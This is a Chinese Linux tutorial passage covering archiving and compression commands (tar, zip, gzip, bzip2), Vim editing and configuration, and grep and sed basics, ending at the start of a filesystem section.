/tmp/ #打包压缩为\".tar.bz2\"格式，注意压缩包文件名 tar -jxvf tmp.tar.bz2 #解压缩与解打包\".tar.bz2\"格式 把文件直接压缩成\".tar.gz\"和\".tar.bz2\"格式，才是 Linux 中最常用的压缩方式 tar 命令最初被用来在磁带上创建备份，现在可以在任何设备上创建备份。利用 tar 命令可以把一大堆的文件和目录打包成一个文件，这对于备份文件或是将几个文件组合成为一个文件进行网络传输是非常有用的 Linux zip命令：压缩文件或目录 我们经常会在 Windows 系统上使用 “.zip”格式压缩文件，其实“.zip”格式文件是 Windows 和 Linux 系统都通用的压缩文件类型，属于几种主流的压缩格式（zip、rar等）之一，是一种相当简单的分别压缩每个文件的存储格式 本节要讲的 zip 命令，类似于 Windows 系统中的 winzip 压缩程序，其基本格式如下： zip [选项] 压缩包名 源文件或源目录列表 注意，zip 压缩命令需要手工指定压缩之后的压缩包名，注意写清楚扩展名，以便解压缩时使用。 该命令常用的几个选项及各自的含义如表所示。 选项 含义 -r 递归压缩目录，及将制定目录下的所有文件以及子目录全部压缩。 -m 将文件压缩之后，删除原始文件，相当于把文件移到压缩文件中。 -v 显示详细的压缩过程信息。 -q 在压缩的时候不显示命令的执行过程。 -压缩级别 压缩级别是从 1~9 的数字，-1 代表压缩速度更快，-9 代表压缩效果更好。 -u 更新压缩文件，即往压缩文件中添加新文件。 zip 命令的基本使用 [root@localhost ~]# zip ana.zip anaconda-ks.cfg adding: anaconda-ks.cfg (deflated 37%) #压缩 [root@localhost ~]# ll ana.zip -rw-r--r-- 1 root root 935 6月 1716:00 ana.zip #压缩文件生成 不仅如此，所有的压缩命令都可以同时压缩多个文件，例如： [root@localhost ~]# zip test.zip install.log install.log.syslog adding: install.log (deflated 72%) adding: install.log.syslog (deflated 85%) #同时压缩多个文件到test.zip压缩包中 [root@localhost ~]#ll test.zip -rw-r--r-- 1 root root 8368 6月 1716:03 test.zip #压缩文件生成 使用 zip 命令压缩目录，需要使用“-r”选项，例如： [root@localhost ~]# mkdir dir1 #建立测试目录 [root@localhost ~]# zip -r dir1.zip dir1 adding: dir1/(stored 0%) #压缩目录 [root@localhost ~]# ls -dl dir1.zip -rw-r--r-- 1 root root 160 6月 1716:22 dir1.zip #压缩文件生成 Linux unzip命令：解压zip文件 unzip 命令可以查看和解压缩 zip 文件。该命令的基本格式如下： [root@localhost ~]# unzip [选项] 压缩包名 此命令常用的选项以及各自的含义如表所示。 选项 含义 -d 目录名 将压缩文件解压到指定目录下。 -n 解压时并不覆盖已经存在的文件。 -o 解压时覆盖已经存在的文件，并且无需用户确认。 -v 查看压缩文件的详细信息，包括压缩文件中包含的文件大小、文件名以及压缩比等，但并不做解压操作。 -t 测试压缩文件有无损坏，但并不解压。 -x 文件列表 解压文件，但不包含文件列表中指定的文件。 不论是文件压缩包，还是目录压缩包，都可以直接解压缩 [root@localhost ~]# unzip dir1.zip Archive: dir1.zip creating: dirl/ #解压缩 使用 -d 选项手动指定解压缩位置，例如： [root@localhost ~]# unzip -d /tmp/ ana.zip Archive: ana.zip inflating: /tmp/anaconda-ks.cfg #把压缩包解压到指定位置 Linux gzip命令：压缩文件或目录 gzip 是 Linux 系统中经常用来对文件进行压缩和解压缩的命令，通过此命令压缩得到的新文件，其扩展名通常标记为“.gz”。 再强调一下，gzip 命令只能用来压缩文件，不能压缩目录，即便指定了目录，也只能压缩目录内的所有文件。 gzip 命令的基本格式如下： [root@localhost ~]# gzip [选项] 源文件 命令中的源文件，当进行压缩操作时，指的是普通文件；当进行解压缩操作时，指的是压缩文件。该命令常用的选项及含义如表 1 所示。 选项 含义 -c 将压缩数据输出到标准输出中，并保留源文件。 -d 对压缩文件进行解压缩。 -r 递归压缩指定目录下以及子目录下的所有文件。 -v 对于每个压缩和解压缩的文件，显示相应的文件名和压缩比。 -l 对每一个压缩文件，显示以下字段：压缩文件的大小；未压缩文件的大小；压缩比；未压缩文件的名称。 -数字 用于指定压缩等级，-1 压缩等级最低，压缩比最差；-9 压缩比最高。默认压缩比是 -6。 【例 1】基本压缩。 gzip 压缩命令非常简单，甚至不需要指定压缩之后的压缩包名，只需指定源文件名即可。我们来试试： [root@localhost ~]# gzip install.log #压缩instal.log 文件 [root@localhost ~]# ls anaconda-ks.cfg install.log.gz install.log.syslog #压缩文件生成，但是源文件也消失了 【例 2】保留源文件压缩。 在使用 gzip 命令压缩文件时，源文件会消失，从而生成压缩文件。这时有些人会有强迫症，就逼问笔者：能不能在压缩文件的时候，不让源文件消失？好吧，也是可以的，不过很别扭。 [root@localhost ~]# gzip -c anaconda-ks.cfg >anaconda-ks.cfg.gz #使用-c选项，但是不让压缩数据输出到屏幕上，而是重定向到压缩文件中，这样可以缩文件的同时不删除源文件 [root@localhost ~]# ls anaconda-ks.cfg anaconda-ks.cfg.gz install.log.gz install.log.syslog #可以看到压缩文件和源文件都存在 【例 3】 压缩目录。 我们可能会想当然地认为 gzip 命令可以压缩目录。 我们来试试： [root@localhost ~]# mkdir test [root@localhost ~]# touch test/test1 [root@localhost ~]# touch test/test2 [root@localhost ~]# touch test/test3 #建立测试目录，并在里面建立几个测试文件 [root@localhost ~]# gzip -r test/ #压缩目录，并没有报错 [root@localhost ~]# ls anaconda-ks.cfg anaconda-ks.cfg.gz install.log.gz install.log.syslog test #但是查看发现test目录依然存在，并没有变为压缩文件 [root@localhost ~]# ls test/ testl .gz test2.gz test3.gz #原来gzip命令不会打包目录，而是把目录下所有的子文件分别压缩 在 Linux 中，打包和压缩是分开处理的。而 gzip 命令只会压缩，不能打包，所以才会出现没有打包目录，而只把目录下的文件进行压缩的情况。 Linux gunzip命令：解压缩文件或目录 gunzip 是一个使用广泛的解压缩命令，它用于解压被 gzip 压缩过的文件（扩展名为 .gz）。 对于解压被 gzip 压缩过的文件，还可以使用 gzip 自己，即 gzip -d 压缩包。 gunzip 命令的基本格式为： [root@localhost ~]# gunzip [选项] 文件 该命令常用的选项及含义如表所示。 选项 含义 -r 递归处理，解压缩指定目录下以及子目录下的所有文件。 -c 把解压缩后的文件输出到标准输出设备。 -f 强制解压缩文件，不理会文件是否已存在等情况。 -l 列出压缩文件内容。 -v 显示命令执行过程。 -t 测试压缩文件是否正常，但不对其做解压缩操作。 【例 1】直接解压缩文件。 [root@localhost ~]# gunzip install.log.gz 当然，\"gunzip -r\"依然只会解压缩目录下的文件，而不会解打包。要想解压缩\".gz\"格式，还可以使用 \"gzip -d\"命令，例如： [root@localhost ~]# gzip -d anaconda-ks.cfg.gz 【例 2】要解压缩目录下的内容，则需使用 \"-r\" 选项，例如： [root@localhost ~]# gunzip -r test/ 注意，如果我们压缩的是一个纯文本文件，则可以直接使用 zcat 命令在不解压缩的情况下查看这个文本文件中的内容。例如： [root@localhost ~]# zcat anaconda-ks.cfg.gz Linux bzip2命令：压缩文件（.bz2格式） bzip2 命令同 gzip 命令类似，只能对文件进行压缩（或解压缩），对于目录只能压缩（或解压缩）该目录及子目录下的所有文件。当执行压缩任务完成后，会生成一个以“.bz2”为后缀的压缩包 \".bz2\"格式是 Linux 的另一种压缩格式，从理论上来讲，\".bz2\"格式的算法更先进、压缩比更好；而 \".gz\"格式相对来讲的时间更快。 bzip2 命令的基本格式如下： [root@localhost ~]# bzip2 [选项] 源文件 源文件指的要压缩或解压缩的文件，该命令常用的选项及各自的含义如表 1 所示。 选项 含义 -d 执行解压缩，此时该选项后的源文件应为标记有 .bz2 后缀的压缩包文件。 -k bzip2 在压缩或解压缩任务完成后，会删除原始文件，若要保留原始文件，可使用此选项。 -f bzip2 在压缩或解压缩时，若输出文件与现有文件同名，默认不会覆盖现有文件，若使用此选项，则会强制覆盖现有文件。 -t 测试压缩包文件的完整性。 -v 压缩或解压缩文件时，显示详细信息。 -数字 这个参数和 gzip 命令的作用一样，用于指定压缩等级，-1 压缩等级最低，压缩比最差；-9 压缩比最高 注意，gzip 只是不会打包目录，但是如果使用“-r”选项，则可以分别压缩目录下的每个文件；而 bzip2 命令则根本不支持压缩目录，也没有“-r”选项。 【例 1】直接压缩文件。 [root@localhost ~]# bzip2 anaconda-ks.cfg #压缩成\".bz2\"格式 此压缩命令会在压缩的同时删除源文件。 【例 2】压缩的同时保留源文件。 [root@localhost ~]# bzip2 -k install.log.syslog #压缩 [root@localhost ~]# ls anaconda-ks.cfg.bz2 install.loginstalLlogsyslog install.logsyslogbz2 #压缩文件和源文件都存在 Linux bunzip2命令：bz2格式的解压缩命令 要解压“.bz2”格式的压缩包文件，除了使用“bzip2 -d 压缩包名”命令外，还可以使用 bunzip2 命令。 bunzip2 命令的使用和 gunzip 命令大致相同，bunzip2 命令只能用于解压文件，即便解压目录，也是解压该目录以及所含子目录下的所有文件。 bunzip2 命令的基本格式为： [root@localhost ~]# bunzip2 [选项] 源文件 此命令常用的选项以及各自的含义，如表 1 所示。 选项 含义 -k 解压缩后，默认会删除原来的压缩文件。若要保留压缩文件，需使用此参数。 -f 解压缩时，若输出的文件与现有文件同名时，默认不会覆盖现有的文件。若要覆盖，可使用此选项。 -v 显示命令执行过程。 -L 列出压缩文件内容。 先试试使用 bunzip2 命令来进行解压缩，例如： [root@localhost ~]# bunzip2 anaconda-ks.cfg.bz2 \".bz2\" 格式也可以使用 \"bzip2 -d 压缩包\" 命令来进行解压缩，例如： [root@localhost ~]# bzip2 -d install.log.syslog.bz2 和 \".gz\" 格式一样，\".bz2\" 格式压缩的纯文本文件也可以不解压缩直接查看，使用的命令是 bzcat。例如： [root@localhost ~]# bzcat install.log.syslog.bz2 Vim 文本编辑器 Vim 编辑文件时，存在 3 种工作模式，分别是命令模式、输入模式和编辑模式，这 3 种工作模式可随意切换，如图 1 所示 Vim的命令模式 使用 Vim 编辑文件时，默认处于命令模式。此模式下，可使用方向键（上、下、左、右键）或 k、j、h、i 移动光标的位置，还可以对文件内容进行复制、粘贴、替换、删除等操作。 图 2 所示是在 CentOS 6.x 系统中 Vim 处于命令模式的状态示意图。 Vim的输入模式 在输入模式下，Vim 可以对文件执行写操作，类似于在 Windows 系统的文档中输入内容。 使 Vim 进行输入模式的方式是在命令模式状态下输入 i、I、a、A、o、O 等插入命令（各指令的具体功能如表 3 所示），当编辑文件完成后按 Esc 键即可返回命令模式。 快捷键 功能描述 i 在当前光标所在位置插入随后输入的文本，光标后的文本相应向右移动 I 在光标所在行的行首插入随后输入的文本，行首是该行的第一个非空白字符，相当于光标移动到行首执行 i 命令 o 在光标所在行的下面插入新的一行。光标停在空行首，等待输入文本 O 在光标所在行的上面插入新的一行。光标停在空行的行首，等待输入文本 a 在当前光标所在位置之后插入随后输入的文本 A 在光标所在行的行尾插入随后输入的文本，相当于光标移动到行尾再执行a命令 图 4 所示即为 Vim 处于输入模式状态下的示意图。 Vim 的编辑模式 编辑模式用于对文件中的指定内容执行保存、查找或替换等操作。 使 Vim 切换到编辑模式的方法是在命令模式状态下按“：”键，此时 Vim 窗口的左下方出现一个“：”符号，这是就可以输入相关指令进行操作了。 指令执行后 Vim 会自动返回命令模式。如想直接返回命令模式，按 Esc 即可。 图 4 所示为 Vim 进入编辑模式后的状态。 Linux Vim基本操作（文件的打开和编辑）完全攻略（有图有真相） 我们还可以利用下表中打开文件的命令格式，针对特定情形使用适当的打开方式，可以大大提高我们的效率。 Vi 使用的选项 说 明 vim filename 打开或新建一个文件，并将光标置于第一行的首部 vim -r filename 恢复上次 vim 打开时崩溃的文件 vim -R filename 把指定的文件以只读方式放入 Vim 编辑器中 vim + filename 打开文件，并将光标置于最后一行的首部 vi +n filename 打开文件，并将光标置于第 n 行的首部 vi +/pattern filename 打幵文件，并将光标置于第一个与 pattern 匹配的位置 vi -c command filename 在对文件进行编辑前，先执行指定的命令 同样，Vim 提供了大量的编辑快捷键，主要可分为以下几类。 Vim 插入文本 从命令模式进入输入模式进行编辑，可以按下 I、i、O、o、A、a 等键来完成，使用不同的键，光标所处的位置不同，如表 3 所示。 快捷键 功能描述 i 在当前光标所在位置插入随后输入的文本，光标后的文本相应向右移动 I 在光标所在行的行首插入随后输入的文本，行首是该行的第一个非空白字符，相当于光标移动到行首执行 i 命令 o 在光标所在行的下面插入新的一行。光标停在空行首，等待输入文本 O（大写） 在光标所在行的上面插入新的一行。光标停在空行的行首，等待输入文本 a 在当前光标所在位置之后插入随后输入的文本 A 在光标所在行的行尾插入随后输入的文本，相当于光标移动到行尾再执行 a 命令 Vim 查找文本 快捷键 功能描述 /abc 从光标所在位置向前查找字符串 abc /^abc 查找以 abc 为行首的行 /abc$ 查找以 abc 为行尾的行 ?abc 从光标所在为主向后查找字符串 abc n 向同一方向重复上次的查找指令 N 向相反方向重复上次的查找指定 在查找过程中需要注意的是，要查找的字符串是严格区分大小写的，如查找 \"shenchao\" 和 \"ShenChao\" 会得到不同的结果。 如果想忽略大小写，则输入命令 \":set ic\"；调整回来输入\":set noic\"。 如果在字符串中出现特殊符号，则需要加上转义字符 \"\\\"。常见的特殊符号有 \\、*、?、$ 等。如果出现这些字符，例如，要查找字符串 \"10$\"，则需要在命令模式中输入 \"/10$\"。 Vim 替换文本 快捷键 功能描述 r 替换光标所在位置的字符 R 从光标所在位置开始替换字符，其输入内容会覆盖掉后面等长的文本内容，按“Esc”可以结束 :s/a1/a2/g 将当前光标所在行中的所有 a1 用 a2 替换 :n1,n2s/a1/a2/g 将文件中 n1 到 n2 行中所有 a1 都用 a2 替换 :g/a1/a2/g(不支持) 将文件中所有的 a1 都用 a2 替换 例如，要将某文件中所有的 \"root\" 替换为 \"liudehua\"，则有两种输入命令，分别为： :1, $s/root/liudehua/g 或 :%s/root/liudehua/g 上述命令是在编辑模式下操作的，表示的是从第一行到最后一行，即全文查找 \"root\"，然后替换成 \"liudehua\"。如果刚才的命令变成 :10,20 s/root/liudehua/g，则只替换从第 10 行到第 20 行的 \"root\"。 Vim删除文本 快捷键 功能描述 x 删除光标所在位置的字符 dd 删除光标所在行 ndd 删除当前行（包括此行）后 n 行文本 dG 删除光标所在行一直到文件末尾的所有内容 D 删除光标位置到行尾的内容 :a1,a2d 函数从 a1 行到 a2 行的文本内容 注意，被删除的内容并没有真正删除，都放在了剪贴板中。将光标移动到指定位置处，按下 \"p\" 键，就可以将刚才删除的内容又粘贴到此处。 Vim复制和粘贴文本 快捷键 功能描述 p 将剪贴板中的内容粘贴到光标后 P（大写） 将剪贴板中的内容粘贴到光标前 y 复制已选中的文本到剪贴板 yy 将光标所在行复制到剪贴板，此命令前可以加数字 n，可复制多行 yw 将光标位置的单词复制到剪贴板 Vim其他常用快捷键 某些情况下，可能需要把两行进行连接。比如说，下面的文件中有两行文本，现在需要将其合并成一行（实际上就是将两行间的换行符去掉）。可以直接在命令模式中按下 \"J\" 键，按下前后如图 10 所示。 如果不小心误删除了文件内容，则可以通过 \"u\" 键来撤销刚才执行的命令。如果要撤销刚才的多次操作，可以多按几次 \"u\" 键。 Vim 保存退出文本 Vim 的保存和退出是在编辑模式中进行的，其常用命令如下表所示 命令 功能描述 :wq 保存并退出 Vim 编辑器 :wq! 保存并强制退出 Vim 编辑器 :q 不保存就退出 Vim 编辑器 :q! 不保存，且强制退出 Vim 编辑器 :w 保存但是不退出 Vim 编辑器 :w! 强制保存文本 :w filename 另存到 filename 文件 :x！ 保存文本，并退出 Vim 编辑器，更通用的一个 vim 命令 ZZ 直接退出 Vim 编辑器 需要注意的是，\"w!\" 和 \"wq!\" 等类似的指令，通常用于对文件没有写权限的时候（显示 readonly，如图 12 所示），但如果你是文件的所有者或者 root 用户，就可以强制执行。 Vim移动光标快捷键汇总 Vim 文本编辑器中，最简单的移动光标的方式是使用方向键，但这种方式的效率太低，更高效的方式使用快捷键。 Vim 移动光标常用的快捷键及其功能如下面各表所示，需要注意的是，表中所有的快捷键都在命令模式（默认状态）下直接使用。 方向键 快捷键 功能描述 h 光标向左移动一位 j 光标向下移动一行（以回车为换行符），也就是光标向下移动 k 光标向上移动一行（也就是向上移动） l 光标向右移动一位 最初使用，大家可能觉得比较别扭，但熟能生巧，使用此方式移动光标同样能够提高编辑速度。 光标以单词为单位移动 快捷键 功能描述 w 或 W 光标移动至下一个单词的单词首 b 或 B 光标移动至上一个单词的单词首 e 或 E 光标移动至下一个单词的单词尾 nw 或 nW n 为数字，表示光标向右移动 n 个单词 nb 或 nB n 为数字，表示光标向左移动 n 个单词 光标移动至行首或行尾 快捷键 功能描述 0 或 ^ 光标移动至当前行的行首 $ 光标移动至当前行的行尾 n$ 光标移动至当前行只有 n 行的行尾，n为数字 光标移动至指定字符 一行中，如果需要将光标移动到当前行的某个特点字符，则可以使用表 4 中的快捷键。 快捷键 功能描述 fx 光标移动至当前行中下一个 x 字符处 Fx 光标移动至当前行中下一个 x 字符处 光标移动到指定行 快捷键 功能描述 gg 光标移动到文件开头 G 光标移动至文件末尾 nG 光标移动到第 n 行，n 为数字 :n 编辑模式下使用的快捷键，可以将光标快速定义到指定行的行首 光标移动到匹配的括号处 程序员在编辑程序时，经常会为将光标移动到与一个 \"(\" 匹配的 \")\" （对于 [] 和 {} 也是一样的）处而感到头疼。Vim 里面提供了一个非常方便地査找匹配括号的命令，这就是 \"%\"。 比如，在 /etc/init.d/sshd 脚本文件中（最好还是复制后练习，小心驶得万年船），想迅速地将光标定位到与第 49 行的 \"{\" 相对应的 \"}\" 处，则可以将光标先定位在 \"{\" 处，然后再使用 \"％\" 命令，使之定位在 \"}\" 处，如图 6 所示。 Linux Vim撤销和恢复撤销快捷键用法详解 使用 Vim 编辑文件内容时，经常会有如下 2 种需求： 对文件内容做了修改之后，却发现整个修改过程是错误或者没有必要的，想将文件恢复到修改之前的样子。 将文件内容恢复之后，经过仔细考虑，又感觉还是刚才修改过的内容更好，想撤销之前做的恢复操作。 基于这 2 种需求，Vim 编辑器提供了撤销和恢复撤销的命令，如表 1 所示。 快捷键 功能 u（小写） undo 的第 1 个字母，功能是撤销最近一次对文本做的修改操作。 Ctrl+R Redo 的第 1 个字母，功能是恢复最近一次所做的撤销操作。 U（大写） 第一次会撤销对一行文本（光标所在行）做过的全部操作，第二次使用该命令会恢复对该行文本做过的所有操作。 注意，以上这 3 种命令都必须在 Vim 编辑器处于命令模式时才能使用 下面通过一个例子来演示以上 3 个命令的具体用法。首先，我们新建一个 demo.txt 文件并打开，键入一行内容，例如： http://c.biancheng.net 然后按“Esc”键，使 Vim 由输入模式转为命令模式，并使用 yy 命令将这一行文本复制到剪贴板中，如此我们就可以在文本任意位置通过键入 p（或大写的 P）命令将复制的内容粘贴到光标所在的位置。 假设我们将光标调整到第一行最后一个字符处，连续按两次 p 命令（粘贴 2 次），则此时文本中的内容变为： http://c.biancheng.net http://c.biancheng.net http://c.biancheng.net 在此基础上，通过 u（小写）命令就可以使文本内容恢复到上一次做粘贴操作之前的样子，其中“上一次”的含义是，恢复操作是可以叠加的，即按一次就会在现有基础上做一次恢复操作。 比如，继续操作 demo.txt 文件，按一次 u，会发现其文本内容变为： http://c.biancheng.net http://c.biancheng.net 再按一次 u，文本内容继续恢复为： http://c.biancheng.net 同样，恢复撤销的操作和撤销操作是相对应的，通过按 Ctrl+R 组合键，可以撤销之前所做的一次恢复操作。例如，继续操作 demo.txt 文件，按一次 Ctrl+R，会发现其文本内容恢复为： http://c.biancheng.net http://c.biancheng.net 再按一次 Ctrl+R，文本内容又恢复为： http://c.biancheng.net http://c.biancheng.net http://c.biancheng.net U（大写）的功能和之前的 2 个命令不同，它的作用是撤销或恢复撤销对光标所在行文本所做的全部操作。比如，我们对 demo.txt 文件内容做如下修改： http://c.biancheng.net http://c.biancheng.net Linux教程 http://c.biancheng.net/linux_tutorial/ 可以看到，这里对第三行文本做了 2 处修改（红色标注部分）。在此基础上，如果在命令模式下键入 U（大写），可以看到，之前对第 3 行所做的 2 处修改，全部被恢复了： http://c.biancheng.net http://c.biancheng.net http://c.biancheng.net 如果此时再键入 U（大写），则又会恢复之前对第 3 行文本做过的全部操作： http://c.biancheng.net http://c.biancheng.net Linux教程 http://c.biancheng.net/linux_tutorial/ Vim多窗口编辑模式 在编辑文件时，有时需要参考另一个文件，如果在两个文件之间进行切换则比较麻烦。可以使用 Vim 同时打开两个文件，每个文件分别占用一个窗口。 例如，在査看 /etc/passwd 时需要参考 /etc/shadow，有两种办法可以实现： 先使用 Vim 打开第一个文件，接着输入命 令 \":sp/etc/shadow\" 水平切分窗口，然后按回车键；如果想垂直切分窗口则可以输入 \":vs/etc/shadow\"; 可以直接执行命令\"vim -o 第一个文件名 第二个文件名\"，也就是 \"vim-o /etc/passwd /etc/shadow\"。 切换到另一个文件窗口，可以按 \"Ctrl+WW\" 快捷键。 如果想将一个文件的内容全部复制到另一个文件中，则可以输入命令 \":r 被复制的文件名\"，即可将导入文件的全部内容复制到当前光标所在行下面。 Vim显示行号 在使用 Vim 进行编辑的过程中，经常会遇到需要同时对连续几行进行操作的情况，这时如果每行都有行号提示，就会非常方便。 在命令模式下输入\":set nu\"即可显示每一行的行号，如图 1 所示。 如果想要取消行 号，则再次输入\":set nonu\"即可。 如果希望每次打开文件都默认显示行号，则可以编辑 Vim 的配置文件。每次使用 Vim 打开文件时，Vim 都会到当前登录用户的宿主目录（用户配置文件所在地）中读取 .vimrc 文件，此文件可以对 Vim 进行一些默认配置设定。 如果 .vimrc 文件存在，就先读取其中对 Vim 的设置；否则就采取默认配置。在默认情况下，用户宿主目录中是没有此文件的，需要在当前用户的宿主目录中手工建立，如\"vim~/.vimrc\"，\"~\"代表宿主目录，root 的宿主目录为 /root/，普通用户的宿主目录存放在 /home/ 目录下。可以直接使用 Vim 编辑生成此文件，并在此文件中添加一行\"set nu\"，保存并退出，如图 2 所示。 之后此用户登录，每次 Vim 打开文件时，都会默认显示行号。常见的可以写入 .vimrc 文件中的设置参数如表 3 所示 设置参数 含 义 :set nu :set nonu 设置与取消行号。 :syn on :syn off 是否依据语法显示相关的颜色帮助。在Vim中修改相关的配置文件或Shell脚本文件 时（如前面示例的脚本/etc/init.d/sshd)，默认会显示相应的颜色，用来帮助排错。如果觉得颜色产生了干扰，则可以取消此设置 set hlsearch set nohlsearch 设置是否将査找的字符串高亮显示。默认是hlsearch高亮显示 set nobackup set backup 是否保存自动备份文件。默认是nobackup不自动备份。如果设定了:set backup，则会产生“文件名〜”作为备份文件 set ruler set noruler 设置是否显示右下角的状态栏。默认是ruler显示 set showmode set noshowmode 设置是否在左下角显示如“一INSERT--”之类的状态栏。默认是showmode显示 设置参数实在太多了，这里只列举了常见的几个，可以使用\":set all\"命令査看所有的设置参数。这些设置参数都可以写入 .vimrc 配置文件中，让它们永久生效，也可在 Vim 中执行，让它们临时生效。 Vim配置文件（.vimrc）详解 Vim 启动时，会根据配置文件（.vimrc）来设置 Vim，因此我们可以通过此文件来定制适合自己的 Vim。 Vim 配置文件分为系统配置文件和用户配置文件： 系统配置文件位于 Vim 的安装目录（默认路径为 /etc/.vimrc）； 用户配置文件位于主目录 ~/.vimrc，即通过执行 vim ~/.vimrc 命令即可对此配置文件进行合理修改。通常情况下，Vim 用户配置文件需要自己手动创建。 注意，Vim 用户配置文件比系统配置文件的优先级高，换句话说，Vim 启动时，会优先读取 Vim 用户配置文件（位于主目录中的），所以我们只需要修改用户配置文件即可（不建议直接修改系统配置文件）。 Vim 提供的环境配置参数有很多，本节不一一列举，大家可以在 Vim 中输入“：set all”指令来查询，本节仅对常用的几个功能设置做详细介绍。 设置参数 功能描述 set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936 set termencoding=utf-8 set encoding=utf-8 设置编码格式，encoding 选项用于缓存的文本、寄存器、Vim 脚本文件等；fileencoding 选项是 Vim 写入文件时采用的编码类型；termencoding 选项表示输出到终端时采用的编码类型。 set nu set number nu 是 number 的缩写，所以上面两个配置命令是完全等效的，二选一即可。取消行号可使用 set nonu。 set cursorline 突出显示当前行。 set mouse=a set selection=exclusive set selectmode=mouse,key Vim 编辑器里默认是不启用鼠标的，通过此设置即可启动鼠标。 set autoindent 设置自动缩进，即每行的缩进同上一节相同。 set tabstop=4 设置 Tab 键宽度为 4 个空格。 注意，表中各配置参数前面可以添加冒号（：），也可以省略，两种写法都可以。 通过以上方式，可以对用户配置文件（.vimrc）进行编辑，进而实现对 Vim 的永久自定义。 在 Vim 编辑模式中，通过 “:set nu” 命令也可以让 Vim 显示行号，但只是临时有效，下次使用 Vim 编辑文件还是不显示行号。而本节介绍的编辑配置文件设置 Vim 的方式，对 Vim 的设置是永久的。 Linux 三剑客(grep,awak,sed) Linux grep命令详解：查找文件内容 很多时候，我们并不需要列出文件的全部内容，而是从文件中找到包含指定信息的那些行，要实现这个目的，可以使用 grep 命令。 grep 命令的由来可以追溯到 UNIX 诞生的早期，在 UNIX 系统中，搜索的模式（patterns）被称为正则表达式（regular expressions），为了要彻底搜索一个文件，有的用户在要搜索的字符串前加上前缀 global（全面的），一旦找到相匹配的内容，用户就像将其输出（print）到屏幕上，而将这一系列的操作整合到一起就是 global regular expressions print，而这也就是 grep 命令的全称。 grep命令能够在一个或多个文件中，搜索某一特定的字符模式（也就是正则表达式），此模式可以是单一的字符、字符串、单词或句子。 正则表达式是描述一组字符串的一个模式，正则表达式的构成模仿了数学表达式，通过使用操作符将较小的表达式组合成一个新的表达式。正则表达式可以是一些纯文本文字，也可以是用来产生模式的一些特殊字符。为了进一步定义一个搜索模式，grep 命令支持如表 1 所示的这几种正则表达式的元字符（也就是通配符） 通配符 功能 c* 将匹配 0 个（即空白）或多个字符 c（c 为任一字符）。 . 将匹配任何一个字符，且只能是一个字符。 [xyz] 匹配方括号中的任意一个字符。 xyz 匹配除方括号中字符外的所有字符。 ^ 锁定行的开头。 $ 锁定行的结尾。 需要注意的是，在基本正则表达式中，如通配符 、+、{、|、( 和 )等，已经失去了它们原本的含义，而若要恢复它们原本的含义，则要在之前添加反斜杠 \\，如 \\、+、{、|、( 和 )。 grep 命令是用来在每一个文件或中（或特定输出上）搜索特定的模式，当使用 grep 时，包含指定字符模式的每一行内容，都会被打印（显示）到屏幕上，但是使用 grep 命令并不改变文件中的内容。 grep 命令的基本格式如下： [root@localhost ~]# grep [选项] 模式 文件名 这里的模式，要么是字符（串），要么是正则表达式。而此命令常用的选项以及各自的含义如表 2 所示。 选项 含义 -c 仅列出文件中包含模式的行数。 -i 忽略模式中的字母大小写。 -l 列出带有匹配行的文件名。 -n 在每一行的最前面列出行号。 -v 列出没有匹配模式的行。 -w 把表达式当做一个完整的单字符来搜寻，忽略那些部分匹配的行。 注意，如果是搜索多个文件，grep 命令的搜索结果只显示文件中发现匹配模式的文件名；而如果搜索单个文件，grep 命令的结果将显示每一个包含匹配模式的行。 【例 1】假设有一份 emp.data 员工清单，现在要搜索此文件，找出职位为 CLERK 的所有员工，则执行命令如下： [root@localhost ~]# grep CLERK emp.data \\#忽略输出内容 而在此基础上，如果只想知道职位为 CLERK 的员工的人数，可以使用“-c”选项，执行命令如下： [root@localhost ~]# grep -c CLERK emp.data #忽略输出内容 【例 2】搜索 emp.data 文件，使用正则表达式找出以 78 开头的数据行，执行命令如下： [root@localhost ~]# grep ^78 emp.data #忽略输出内容 Linux sed命令完全攻略（超级详细） 我们知道，Vim 采用的是交互式文本编辑模式，你可以用键盘命令来交互性地插入、删除或替换数据中的文本。但本节要讲的 sed 命令不同，它采用的是流编辑模式，最明显的特点是，在 sed 处理数据之前，需要预先提供一组规则，sed 会按照此规则来编辑数据。 sed 会根据脚本命令来处理文本文件中的数据，这些命令要么从命令行中输入，要么存储在一个文本文件中，此命令执行数据的顺序如下： 每次仅读取一行内容； 根据提供的规则命令匹配并修改数据。注意，sed 默认不会直接修改源文件数据，而是会将数据复制到缓冲区中，修改也仅限于缓冲区中的数据； 将执行结果输出。 当一行数据匹配完成后，它会继续读取下一行数据，并重复这个过程，直到将文件中所有数据处理完毕。 sed 命令的基本格式如下： [root@localhost ~]# sed [选项] [脚本命令] 文件名 选项 含义 -e 脚本命令 该选项会将其后跟的脚本命令添加到已有的命令中。 -f 脚本命令文件 该选项会将其后文件中的脚本命令添加到已有的命令中。 -n 默认情况下，sed 会在所有的脚本指定执行完毕后，会自动输出处理后的内容，而该选项会屏蔽启动输出，需使用 print 命令来完成输出。 -i 此选项会直接修改源文件，要慎用。 成功使用 sed 命令的关键在于掌握各式各样的脚本命令及格式，它能帮你定制编辑文件的规则。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 18:07:50 "},"知识库/03.主机安全/19.文件系统与文件权限.html":{"url":"知识库/03.主机安全/19.文件系统与文件权限.html","title":"19.文件系统与文件权限","keywords":"","body":"文件系统与文件权限 文件系统 在linux操作系统中，所有的文件和目录都被组织成一个以/结点开始的倒置树状结构，如下图所示 其中，目录就相当于 Windows 中的文件夹，目录中存放的既可以是文件，也可以是其他的子目录，而文件中存储的是真正的信息。 文件系统的最顶层是由根目录开始的，系统使用“/”来表示根目录，在根目录之下的既可以是目录，也可以是文件，而每一个目录中又可以包含（子）目录或文件。如此反复就可以构成一个庞大的文件系统。 其实，使用这种树状、具有层次的文件结构主要目的是方便文件系统的管理和维护，想象一下，如果所有的文件都放在一个目录下，其文件系统的管理和维护将变成一场噩梦。 在文件系统中，有两个特殊的目录，一个是用户所在的工作目录，即当前目录，可用一个点“.”表示；另一个是当前目录的上一层目录，也叫父目录，用两个点“..”表示 如果一个目录或文件名是以一个点开始，就表示这个目录或文件是一个隐藏目录或文件。即以默认方式査找，不显示该目录或文件。 为了方便管理和维护，Linux 系统采用了文件系统层次标准，也称为 FHS 标准，它规定了根目录下各个目录应该存在哪些类型的文件（或子目录），比如说，在 /bin 和 /sbin 目录中存放的应该是可执行文件。 一级目录 功能（作用） /bin 存放系统命令，普通用户和 root 都可以执行。放在 /bin 下的命令在单用户模式下也可以执行 /boot/ 